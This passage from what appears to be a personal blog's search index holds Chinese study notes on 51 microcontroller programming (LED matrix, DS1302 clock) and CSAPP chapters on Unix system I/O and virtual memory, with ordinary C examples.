class="keyword">if</span>(Count&gt;<span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line">            Count = <span class="number">0</span>;</span><br><span class="line">Offset++;</span><br><span class="line"><span class="keyword">if</span>(Offset&gt;<span class="number">72</span>)<span class="comment">//避免数组越界</span></span><br><span class="line">Offset = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">\*main.c*\</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"> \*MatrixLED.c*\   </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;REGX52.H&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Delay.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sbit RCK = P3^<span class="number">5</span>;   <span class="comment">//RCLK,取P3第5位</span></span><br><span class="line">sbit SCK = P3^<span class="number">6</span>;<span class="comment">//SRCLK,取P3第6位</span></span><br><span class="line">sbit SER = P3^<span class="number">4</span>;    <span class="comment">//SER,取P3第4位</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MATRIX_LED_PORTP0 <span class="comment">//LED显示寄存器</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _74HC595_WriteByte(<span class="type">unsigned</span> <span class="type">char</span> Byte)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">SER=Byte&amp;(<span class="number">0x80</span>&gt;&gt;i);<span class="comment">//从高位向低位写入</span></span><br><span class="line">SCK=<span class="number">1</span>;<span class="comment">//上升延移位</span></span><br><span class="line">SCK=<span class="number">0</span>;<span class="comment">//软件复位</span></span><br><span class="line">&#125;</span><br><span class="line">RCK=<span class="number">1</span>;<span class="comment">//锁存</span></span><br><span class="line">RCK=<span class="number">0</span>;<span class="comment">//软件复位</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">MatrixLED_ShowColumn</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> Column,Data)</span></span><br><span class="line">&#123;</span><br><span class="line">_74HC595_WriteByte(Data);<span class="comment">//写入并锁存</span></span><br><span class="line">MATRIX_LED_PORT=~(<span class="number">0x80</span>&gt;&gt;Column);<span class="comment">//选择列写入</span></span><br><span class="line">Delay(<span class="number">1</span>);</span><br><span class="line">MATRIX_LED_PORT=<span class="number">0xFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">MatrixLED_Init</span><span class="params">()</span><span class="comment">//初始化</span></span><br><span class="line">&#123;</span><br><span class="line">SCK=<span class="number">0</span>;</span><br><span class="line">RCK=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> \*MatrixLED.c*\ </span><br></pre></td></tr></table></figure><h3 id="DS1302实时时钟"><a href="#DS1302实时时钟" class="headerlink" title="DS1302实时时钟"></a>DS1302实时时钟</h3><ul><li>DS1302是由美国DALLAS公司推出的具有涓细电流充电能力的低功耗实时时钟芯片。它可以对年、月、日、周、时、分、秒进行计时，且具有闰年补偿等多种功能</li><li>RTC(Real Time Clock)：实时时钟，是一种集成电路，通常称为时钟芯片</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240227185909359.png" alt="image-20240227185909359"></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240227192928469.png" alt="image-20240227192928469"></p><ul><li><p>DS1302 涓流充电计时芯片包含一个实时时钟/日历和 31 字节的静态 RAM.通过简单的串行通信。</p></li><li><p>与时钟/RAM 通讯只需要三根线: CE, I/O (数据线), and SCLK (串行时钟). 数据输出输入时钟/RAM 一次1字节或者在脉冲串中多达 31 字节. </p></li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240227195752523.png" alt="image-20240227195752523"></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240227200002026.png" alt="image-20240227200002026"></p><ul><li>I/O口电平由命令字和数据组成</li><li>CE：操作使能</li><li>根据第一位判断是写入还是读出</li><li>SCLK：上升沿，I/O口电平被写入。下降沿，DS1302输出数据。</li><li>读比写少一个周期</li><li>输出为<code>BCD码</code>,每相邻数字只有一位不同<ul><li>DEC=BCD/16<em>10+BCD%16; （2位BCD）</em></li><li><em>BCD=DEC/10</em>16+DEC%10; （2位BCD）</li></ul></li></ul><p>从这开始就不写全部代码了（懒的敲yes！），主要写写思路：</p><p>通过定义一个数组来存储时间，修改时间也是通过修改时间数组来实现。通过<code>Timeshow()</code>来更新时间数组，通过<code>TimeSet()</code>来设置时间。通过<code>DS1302_SetTime()</code>将时间数组的更新写入时钟。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过按键设置mode值，然后就调用对应函数</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">KeyNum=Key();<span class="comment">//读取键码</span></span><br><span class="line"><span class="keyword">if</span>(KeyNum==<span class="number">1</span>)<span class="comment">//按键1按下</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(MODE==<span class="number">0</span>)&#123;MODE=<span class="number">1</span>;TimeSetSelect=<span class="number">0</span>;&#125;<span class="comment">//功能切换</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(MODE==<span class="number">1</span>)&#123;MODE=<span class="number">0</span>;DS1302_SetTime();&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(MODE)<span class="comment">//根据不同的功能执行不同的函数</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:TimeShow();<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:TimeSet();<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//每次TimeSetFlashFlag为1就熄灭，TimeSetFlashFlag每隔固定时间取反。</span></span><br><span class="line"><span class="keyword">if</span>(TimeSetSelect==<span class="number">0</span> &amp;&amp; TimeSetFlashFlag==<span class="number">1</span>)&#123;LCD_ShowString(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&quot;  &quot;</span>);&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;LCD_ShowNum(<span class="number">1</span>,<span class="number">1</span>,DS1302_Time[<span class="number">0</span>],<span class="number">2</span>);&#125;</span><br></pre></td></tr></table></figure><h3 id="蜂鸣器"><a href="#蜂鸣器" class="headerlink" title="蜂鸣器"></a>蜂鸣器</h3>]]></content>
      
      
      <categories>
          
          <category> 单片机 </category>
          
          <category> 51单片机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 单片机 </tag>
            
            <tag> 51单片机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>csapp第十章——系统级IO</title>
      <link href="/2024/02/26/csapp/%E7%AC%AC10%E7%AB%A0%E2%80%94%E2%80%94%E7%B3%BB%E7%BB%9F%E7%BA%A7IO/"/>
      <url>/2024/02/26/csapp/%E7%AC%AC10%E7%AB%A0%E2%80%94%E2%80%94%E7%B3%BB%E7%BB%9F%E7%BA%A7IO/</url>
      
        <content type="html"><![CDATA[<h1 id="系统级I-O"><a href="#系统级I-O" class="headerlink" title="系统级I/O"></a>系统级I/O</h1><p>输入与输出 (I/O) 是在主存和外部设备（例如磁盘驱动器、终端和网络）之间复制数据的过程。</p><h3 id="UNIX-I-O"><a href="#UNIX-I-O" class="headerlink" title="UNIX I/O"></a>UNIX I/O</h3><ul><li>所有的设备（例如网络、磁盘和终端）都被模型化为文件，而所有的输入和输出都被当作对相应文件的读和写来执行。</li></ul><ul><li><code>打开文件</code>。一个应用程序通过要求内核打开相应的文件，来宣告它想要访问一个设备。内核返回一个小的非负整数，叫做<code>描述符</code>，它在后续对此文件的所有操作中标识这个文件。内核记录有关这个打开文件的所有信息。应用程序只需记住这个描述符。</li><li>Linux shell 创建的每个进程开始时都有三个打开的文件：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* /usr/include/unisted.h  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STDIN_FILENO    0       <span class="comment">/* Standard input.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STDOUT_FILENO   1       <span class="comment">/* Standard output.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STDERR_FILENO   2       <span class="comment">/* Standard error output.  */</span></span></span><br></pre></td></tr></table></figure><ul><li><code>改变当前的文件位置</code>。对于每个打开的文件，内核保持着一个文件位置 k, 是从文件开头起始的字节偏移量。</li><li><code>读写文件</code>。当读操作文件位置k大于文件大小时，触发 end-of-file(EOF) 的条件，应用程序能检测到这个条件。但是在文件结尾没有明确的“EOF”符号。</li><li><code>关闭文件</code>。当应用完成了对文件的访问之后，它就通知内核关闭这个文件。作为响应，内核释放文件打开时创建的数据结构，并将这个描述符恢复到可用的描述符池中。</li></ul><h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><p><strong>文件类型</strong>：</p><ul><li><code>普通文件 (regular file)</code>包含任意数据 。分为文本文件 (text file) 和二进制文件 (binary file) , 对内核而言，文本文件和二进制文件没有区别。</li><li><code>目录（directory)</code>是包含一组链接 (link)的文件，其中每个链接都将一个文件名(filename) 映射到一个文件，这个文件可能是另一个目录。每个目录至少含有两个条目：“．”是到该目录自身的链接，以及”.. “是到目录层次结构中父目录的链接。</li><li>套接字 (socket) 是用来与另一个进程进行跨网络通信的文件 。</li><li>命名通道 (named pipe) 、符号链接 (symbolic link), 以及字符和块设备 (character and block device) ·······</li></ul><p>Linux 内核将所有文件都组织成一个<code>目录层次结构 (directory hierarchy)</code> , 由名为／（斜杠）的根目录确定。系统中的每个文件都是根目录的直接或间接的后代。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240227231054407.png" alt="image-20240227231054407"></p><p>路径名可分为：<code>绝对路径名（absolute pathname）</code>和<code>相对路径名（relative pathname）</code></p><h3 id="打开和关闭文件"><a href="#打开和关闭文件" class="headerlink" title="打开和关闭文件"></a>打开和关闭文件</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span> <span class="comment">//包含了一些系统数据类型的定义</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span> <span class="comment">//包含了文件状态信息的相关定义，比如文件的权限、大小等。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl .h&gt;</span> <span class="comment">//包含了文件控制相关的函数定义，比如打开文件、设置文件属性等。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">open</span><span class="params">(<span class="type">char</span> *filename, <span class="type">int</span> flags, <span class="type">mode_t</span> mode)</span>; <span class="comment">//返回进程中当前没有打开的最小描述符</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">close</span><span class="params">(<span class="type">int</span> fd)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="读和写文件"><a href="#读和写文件" class="headerlink" title="读和写文件"></a>读和写文件</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> n)</span>; </span><br><span class="line"><span class="comment">//返回：若成功则为读的字节数，若 EOF 则为0, 若出错为-1.</span></span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> n)</span>; </span><br><span class="line"><span class="comment">//返回：若成功则为写的字节数，若出错则为-1.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ssize_t为long</span></span><br></pre></td></tr></table></figure><h3 id="RIO包"><a href="#RIO包" class="headerlink" title="RIO包"></a>RIO包</h3><ul><li>无缓冲的输入输出函数</li><li>带缓冲的输入函数</li></ul><p>//TODO</p><h3 id="读取文件元数据"><a href="#读取文件元数据" class="headerlink" title="读取文件元数据"></a>读取文件元数据</h3><ul><li>通过调用<code>stat</code>和<code>fstat</code>函数检索元数据</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;csapp.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">stat</span>;</span></span><br><span class="line">    <span class="type">char</span> *type, *readok;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* $end statcheck */</span></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;usage: %s &lt;filename&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* $begin statcheck */</span></span><br><span class="line">    Stat(argv[<span class="number">1</span>], &amp;stat);</span><br><span class="line">    <span class="keyword">if</span> (S_ISREG(stat.st_mode))     <span class="comment">/* Determine file type */</span></span><br><span class="line">        type = <span class="string">&quot;regular&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (S_ISDIR(stat.st_mode))</span><br><span class="line">        type = <span class="string">&quot;directory&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        type = <span class="string">&quot;other&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ((stat.st_mode &amp; S_IRUSR)) <span class="comment">/* Check read access */</span></span><br><span class="line">        readok = <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        readok = <span class="string">&quot;no&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;type: %s, read: %s\n&quot;</span>, type, readok);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="读取目录内容"><a href="#读取目录内容" class="headerlink" title="读取目录内容"></a>读取目录内容</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;csapp.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    DIR *streamp;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *<span class="title">dep</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* $end readdir */</span></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;usage: %s &lt;pathname&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* $begin readdir */</span></span><br><span class="line">    streamp = Opendir(argv[<span class="number">1</span>]);<span class="comment">//成功返回指针，出错返回NULL</span></span><br><span class="line"></span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((dep = readdir(streamp)) != <span class="literal">NULL</span>) &#123;<span class="comment">//成功返回下一个目录项的指针，没有更多目录项或出错返回-1</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Found file: %s\n&quot;</span>, dep-&gt;d_name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (errno != <span class="number">0</span>)</span><br><span class="line">        unix_error(<span class="string">&quot;readdir error&quot;</span>);</span><br><span class="line"></span><br><span class="line">    Closedir(streamp);<span class="comment">//成功返回0，失败返回-1</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="共享文件"><a href="#共享文件" class="headerlink" title="共享文件"></a>共享文件</h3><p>内核用三个数据结构描述打开的文件：</p><ul><li><code>描述符表 (descriptor table)</code>。每个进程都有它独立的描述符表。</li><li><code>文件表 (file table)</code> 。打开文件的集合是由一张文件表来表示的，所有的进程共享这张表。内核不会删除这个文件表表项，直到它的引用计数为零。</li><li><code>v-node (v-node table)</code> 同文件表一样，所有的进程共享。</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240401222347631.png" alt="image-20240401222347631"></p><ul><li>当以同一个<code>filename</code>调用<code>open</code>两次</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240401222619054.png" alt="image-20240401222619054"></p><ul><li>父子进程共享相同的打开文件表集合</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240401222638861.png" alt="image-20240401222638861"></p><h3 id="I-O重定向"><a href="#I-O重定向" class="headerlink" title="I/O重定向"></a>I/O重定向</h3><ul><li><code>&gt;</code>重定向操作符</li><li><code>dup2(int oldfd,int newfd)</code>复制描述符表表项 oldfd 到描述符表表项 newfd, 覆盖描述符表表项 newfd 以前的内容。</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240401223531305.png" alt="image-20240401223531305"></p><h3 id="标准I-O"><a href="#标准I-O" class="headerlink" title="标准I/O"></a>标准I/O</h3><ul><li>fopen()和fclose()</li><li>fread()和fwrite()</li><li>fgets()和fputs()</li></ul><p>标准I/O将打开的文件模型化为一个流（相当于一个指向FILE类型的指针）</p><p>每个ANSI C 程序开始时都有三个打开的流stdin 、stdout和stderr, 分别对应于标准输入、标准输出和标准错误：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> FILE *Stdin; <span class="comment">// Standard input (descriptor 0) </span></span><br><span class="line"><span class="keyword">extern</span> FILE *Stdout; <span class="comment">// Standard output (descriptor 1) </span></span><br><span class="line"><span class="keyword">extern</span> FILE *stderr; <span class="comment">// Standard error (descriptor 2) </span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
          <category> book </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csapp </tag>
            
            <tag> book </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>csapp第九章——虚拟内存</title>
      <link href="/2024/02/18/csapp/%E7%AC%AC9%E7%AB%A0%E2%80%94%E2%80%94%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/"/>
      <url>/2024/02/18/csapp/%E7%AC%AC9%E7%AB%A0%E2%80%94%E2%80%94%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/</url>
      
        <content type="html"><![CDATA[<h1 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h1><p>虚拟内存提供了三个重要的能力： </p><ol><li>它将主存看成是 个存储在磁盘上的地址空间的高速缓存，在主存中只保存活动区域，并根据需要在磁盘和主存之间来回传送数据，通过这种方式，它高效地使用了主存 </li><li>它为每个进程提供了一致的地址空间，从而简化了内存管理。 </li><li>它保护了每个进程的地址空间不被其他进程破坏</li></ol><h3 id="物理和虚拟内存"><a href="#物理和虚拟内存" class="headerlink" title="物理和虚拟内存"></a>物理和虚拟内存</h3><p>将虚拟地址转换为物理地址的任务叫做<code>地址翻译 (address translation)</code>。</p><p>地址翻译需要 CPU 硬件和操作系统之间的紧密合作 CPU 芯片上叫做<code>内存管理单元</code>(Memory Management Unit, MMU) 的专用硬件，利用存放在主存中的查询表来动态翻译虚拟地址，该表的内容由操作系统管理。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240218022153223.png" alt="image-20240218022153223"></p><h3 id="地址空间"><a href="#地址空间" class="headerlink" title="地址空间"></a>地址空间</h3><p>地址空间 (address space) 个非负整数地址的有序集合：</p><p>一个地址空间的大小是由表示最大地址所需要的位数来描述的。</p><ul><li><p>虚拟地址空间：</p><p>一个包含 N=2**n个地址的虚拟地址空间就叫做一个n位地址空间，现代系统通常支持 32 位或者 64 位虚拟地址空间。</p></li><li><p>物理地址空间：对应于系统中物理内存的M个字节。</p></li></ul><h3 id="虚拟内存作为缓存的工具"><a href="#虚拟内存作为缓存的工具" class="headerlink" title="虚拟内存作为缓存的工具"></a>虚拟内存作为缓存的工具</h3><p>VM 系统通过将虚拟内存分割为称为<code>虚拟页 (Virtual Page, VP)</code> 的大小固定的块。物理内存被分割为物理页 (Physical Page, PP) （物理页也被称为页帧 (page frame ))</p><p>在任意时刻，虚拟页面的集合都分为三个不相交的子集：</p><ul><li>未分配的： VM 系统还未分配（或者创建）的页，未分配的块没有任何数据和它们相关联，因此也就不占用任何磁盘空间。</li><li>已缓存的：当前已缓存在物理内存中的已分配页</li><li>未缓存的：未缓存在物理内存中的已分配页</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240218023457320.png" alt="image-20240218023457320"></p><h4 id="DRAM-缓存的组织结构"><a href="#DRAM-缓存的组织结构" class="headerlink" title="DRAM 缓存的组织结构"></a>DRAM 缓存的组织结构</h4><p>使用术语 SRAM 缓存来表示位于 CPU 和主存之间的 L1、L2、L3 高速缓存，并且用术语 DRAM 缓存来表示虚拟内存系统的缓存，它在主存中缓存虚拟页</p><h4 id="页表"><a href="#页表" class="headerlink" title="页表"></a>页表</h4><p>和一个存放在物理内存中叫做<code>页表 (page table)</code>的数据结构，页表将虚拟页映射到物理页。每次地址翻译硬件将一个虚拟地址转换为物理地址时，都会读取页表。</p><p>操作系统负责维护页表的内容，以及在磁盘与 DRAM 之间来回传送页。因DRAM 缓存是全相联的，所以任意物理页都可以包含任意虚拟页。</p><p>页表就是一个页表条目 (Page Table Entry, PTE) 的数组。虚拟地址空间中的每个页在页表中一个固定偏移处都有一个 PTE。</p><p>每个PTE 是由一个有效位(valid bit) 和一个n 位地址字段组成的。有效位表明了该虚拟页当前是否被物理内存缓存在DRAM 中。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240218025013379.png" alt="image-20240218025013379"></p><h4 id="页命中"><a href="#页命中" class="headerlink" title="页命中"></a>页命中</h4><p>因为设置了有效位，那么地址翻译硬件就知道VP 2 是缓存在内存中的了。所以它使用PTE 中的物理内存地址（该地址指向pp 1 中缓存页的起始位置），构造出这个字的物理地址。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240218025429701.png" alt="image-20240218025429701"></p><h4 id="缺页"><a href="#缺页" class="headerlink" title="缺页"></a>缺页</h4><p>即DRAM缓存不命中，触个缺页异常。缺页异常调用内核中的缺页异常处理程序。选择一个牺牲页，然后将需要的页替换掉牺牲页</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240218184355131.png" alt="image-20240218184355131"></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240218184401314.png" alt="image-20240218184401314"></p><ul><li><p>在磁盘和内存之间传送页的活动叫做<code>交换 (swapping)</code>或者<code>页面调度 (paging)</code> 。</p></li><li><p>当有不命中发生时，才换入页面的这种策略称为<code>按需页面调度 (demand paging)</code>。</p></li></ul><h4 id="又是局部性救了我们"><a href="#又是局部性救了我们" class="headerlink" title="又是局部性救了我们"></a>又是局部性救了我们</h4><ul><li><p>局部性性原则保证了在任意时刻，程序将趋向于在一个较小的活动页面 (active page) 集合上工作，这个集合叫做工作集 (working set) 或者常驻集合(resident set) 。</p></li><li><p>如果工作集的大小超出了物理内存的大小，那么程序将产生一种不幸的状态，叫做抖动 (thrashing), 这时页面将不断地换进换出 。</p></li><li><p>可以利用 Linux getrusage 函数监测缺页的数量（以及许多其他的信息）</p></li></ul><h3 id="虚拟内存作为内存管理的工具"><a href="#虚拟内存作为内存管理的工具" class="headerlink" title="虚拟内存作为内存管理的工具"></a>虚拟内存作为内存管理的工具</h3><p>操作系统为<code>每个进程</code>提供了一个独立的页表，因而也就是一个独立的虚拟地址空间。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240628164234401.png" alt="image-20240628164234401"></p><ul><li><p>简化链接</p><p>不同段在虚拟位置的位置是固定的。这样的一致性极大地简化了链接器的设计和实现，允许链接器生成<code>完全链接</code>的可执行文件，这些可执行文件是独立于物理内存中代码和数据的最终位置的。</p></li><li><p>简化加载</p><p>虚拟内存还使得容易向内存中加载可执行文件和共享对象文件。</p></li></ul><p>Linux 加载器为代码和数据段分配虚拟页，把它们标记为<code>无效的（即未被缓存的）</code>，将页表条目指向目标文件中适当的位置 。加载器从不从磁盘到内存实际复制任何数据 。在每个页初次被引用时，虚拟内存系统会按照需要自动地调入数据页。</p><p>将一组连续的虚拟页映射到任意一个文件中的任意位  示法称作内存映射 (memory mapping) Linux 提供一个称为 mmap 的系统调用，允许应用程序自己做内存映射。</p><ul><li>简化共享</li></ul><p>独立地址空间为操作系统提供了一个管理用户进程和操作系统自身之间共享的一致机制。</p><ul><li>简化内存分配 </li></ul><p>由于页表工作的方式，操作系统没有必要分配连续的物理内存页面。页面可以随机地分散在物理内存中。</p><h3 id="虚拟内存作为内存保护的工具"><a href="#虚拟内存作为内存保护的工具" class="headerlink" title="虚拟内存作为内存保护的工具"></a>虚拟内存作为内存保护的工具</h3><p>SUP 位表示进程是否必须运行在内核（超级用户）模式下才能访问该页。</p><p>如果一条指令违反了这些许可条件，那么 CPU 就触发一个一般保护故障，将控制传递给一个内核中的异常处理程序。 Linux shell 一般将这种异常报告为<code>＂段错误 (segmentation fault)&quot;</code></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240218194515336.png" alt="image-20240218194515336"></p><h3 id="地址翻译"><a href="#地址翻译" class="headerlink" title="地址翻译"></a>地址翻译</h3><p>//TODO</p><h4 id="结合高速缓存和虚拟内存"><a href="#结合高速缓存和虚拟内存" class="headerlink" 